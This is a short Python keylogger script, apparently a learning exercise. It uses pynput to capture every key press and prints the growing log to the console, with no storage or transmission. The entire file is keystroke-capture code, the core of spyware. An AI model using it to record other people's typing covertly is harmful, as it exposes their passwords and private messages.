#! /usr/bin/env python

import pynput.keyboard as pynkey

log = ""


def process_key_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "
    print(log)


keyboard_listener = pynkey.Listener(on_press=process_key_press)
# Can also run it without 'with' block, using .join() method.
with keyboard_listener:
    keyboard_listener.join()
